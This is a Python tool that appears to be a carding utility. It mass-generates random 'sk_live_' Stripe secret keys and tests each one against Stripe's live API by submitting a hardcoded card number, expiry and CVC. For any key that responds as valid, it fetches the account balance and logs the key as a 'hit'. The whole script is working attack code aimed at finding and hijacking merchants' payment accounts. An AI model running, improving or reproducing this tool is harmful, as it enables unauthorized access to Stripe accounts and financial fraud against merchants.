import random
import os
import time
import requests
from pystyle import Colors, Write

# Function to clear the terminal screen
def clean():
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    main()

# Function to generate random SK keys
def generate_random_keys():
    sk_key_string = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    length_min = 24
    length_max = 99

    try:
        amount = int(Write.Input("[?] How many SK keys do you want to generate -> ", Colors.blue_to_cyan, interval=0.035))

        with open("rsk.txt", "w") as f:
            for _ in range(amount):
                length = random.randint(length_min, length_max)
                sk_key = "sk_live_" + "".join(random.choices(sk_key_string, k=length))
                Write.Print(f"{sk_key}\n", Colors.blue_to_purple, interval=0)
                f.write(f"{sk_key}\n")

        Write.Print("\n[!] The SK Keys have been successfully saved in a file!\n", Colors.cyan, interval=0.05)
    except ValueError:
        Write.Print("[!] Invalid input. Please enter a number.\n", Colors.red, interval=0.05)
        clean()

# Function to generate specific length SK keys
def generate_specific_keys():
    sk_key_string = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    lengths = {"1": 24, "2": 34, "3": 99}

    try:
        Write.Print("\n[1] Short Length SK Keys\n[2] Medium Length SK Keys\n[3] Long Length SK Keys\n", Colors.blue_to_cyan)
        choice = Write.Input("[?] Choose the type of SK Key to generate -> ", Colors.blue_to_cyan, interval=0.035)

        if choice not in lengths:
            Write.Print("[!] Invalid choice. Please select 1, 2, or 3.\n", Colors.red, interval=0.05)
            clean()

        amount = int(Write.Input(f"\n[?] How many {['Short', 'Medium', 'Long'][int(choice)-1]} SK keys do you want to generate -> ", Colors.blue_to_cyan, interval=0.035))

        with open(f"sk.txt", "w") as f:
            for _ in range(amount):
                sk_key = "sk_live_" + "".join(random.choices(sk_key_string, k=lengths[choice]))
                Write.Print(f"{sk_key}\n", Colors.blue_to_purple, interval=0)
                f.write(f"{sk_key}\n")

        Write.Print("\n[!] The SK Keys have been successfully saved in a file!\n", Colors.cyan, interval=0.05)
    except ValueError:
        Write.Print("[!] Invalid input. Please enter a number.\n", Colors.red, interval=0.05)
        clean()

# Function to process and validate SK keys, saving live and rate-limited keys to hits.txt
def process_and_save_live_keys(output_filename="hits.txt"):
    sk_key_string = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

    try:
        # Ask user for the filename containing the SK keys
        filename = Write.Input("[?] Please provide the name of the file containing SK keys (e.g., sk.txt , rsk.txt): ", Colors.blue_to_cyan, interval=0.035)

        with open(filename, 'r') as file:
            sk_keys = file.readlines()

        with open(output_filename, 'a') as output_file:
            for sk in sk_keys:
                sk = sk.strip()  # Remove any leading/trailing whitespace or newline characters
                if sk:  # Skip empty lines
                    headers = {"Authorization": f"Bearer {sk}"}
                    data = {
                        "type": "card",
                        "card[number]": "4102770015058552",
                        "card[exp_month]": "06",
                        "card[exp_year]": "24",
                        "card[cvc]": "997"
                    }
                    
                    # Make POST request to Stripe's API
                    response = requests.post("https://api.stripe.com/v1/payment_methods", auth=(sk, ''), data=data)
                    
                    try:
                        stripe1 = response.json()  # Parse the JSON response
                    except ValueError:
                        stripe1 = response.text  # If the response is not JSON, just use the raw text

                    # Check for different responses and save live or rate-limited keys
                    if "declined" in stripe1 or "pm_" in stripe1:
                        # This indicates an active or live key
                        balance_response = requests.get("https://api.stripe.com/v1/balance", headers=headers).json()
                        balance = balance_response.get("amount", "N/A")
                        pending_balance = balance_response.get("pending", [{}])[0].get("amount", "N/A")
                        currency = balance_response.get("currency", "N/A")

                        live_msg = f"""
𝗟𝗜𝗩𝗘 𝗦𝗞 ✅

𝗞𝗲𝗬 :  <code>{sk}</code>

- 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 : {balance}
- 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗔𝗟𝗔𝗡𝗖𝗘: {pending_balance}
- 𝗖𝗨𝗥𝗥𝗘𝗡𝗖𝗬 : {currency}
"""
                        Write.Print(live_msg, Colors.green, interval=0.05)
                        output_file.write(f"{sk} - LIVE\n")
                    
                    elif "rate_limit" in stripe1:
                        # Rate limit response
                        rate_limit_msg = f"""
𝗥𝗔𝗧𝗘 𝗟𝗜𝗠𝗜𝗧 𝗦𝗞 ⚠️

𝗞𝗲𝗬:  <code>{sk}</code>

- 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : Rate limit exceeded.
"""
                        Write.Print(rate_limit_msg, Colors.yellow, interval=0.05)
                        output_file.write(f"{sk} - RATE LIMITED\n")
                    else:
                        Write.Print(f"[!] Invalid SK Key: {sk}\n", Colors.red, interval=0.05)

    except FileNotFoundError:
        Write.Print("[!] SK key file not found.\n", Colors.red, interval=0.05)

# Main function to control the flow of the program
def main():
    # Banner with Developer Info using raw string for proper formatting
    Write.Print(r"""
 ____  _  __           ____  ____  ____  ____  _  __ _____ ____
/ ___\/ |/ /          /   _\/  __\/  _ \/   _\/ |/ //  __//  __\
|    \|   /   _____   |  /  |  \/|| / \||  /  |   / |  \  |  \/|
\___ ||   \   \____\  |  \_ |    /| |-|||  \_ |   \ |  /_ |    /
\____/\_|\_\          \____/\_/\_\\_/ \|\____/\_|\_\\____\\_/\_\ 
                                                            
    """, Colors.cyan, interval=0.05)

    Write.Print("\nDeveloped By: AntifiedNull[Prateek]\n", Colors.cyan, interval=0.05)

    try:
        Write.Print("\n[1] Random SK Key Generator\n[2] Specific Length SK Key Generator\n[3] SK Keys Checker\n", Colors.blue_to_cyan)
        choice = Write.Input("\n> Select an option: ", Colors.blue_to_cyan, interval=0.035)

        if choice == "1":
            generate_random_keys()
        elif choice == "2":
            generate_specific_keys()
        elif choice == "3":
            process_and_save_live_keys()  # Process and save live SK keys from the user-defined file
        else:
            Write.Print("[!] Invalid choice. Please select 1, 2, or 3.\n", Colors.red, interval=0.05)
            clean()

    except KeyboardInterrupt:
        Write.Print("\n:) Have a nice day and see you later!\n", Colors.cyan, interval=0.05)
        exit()


main()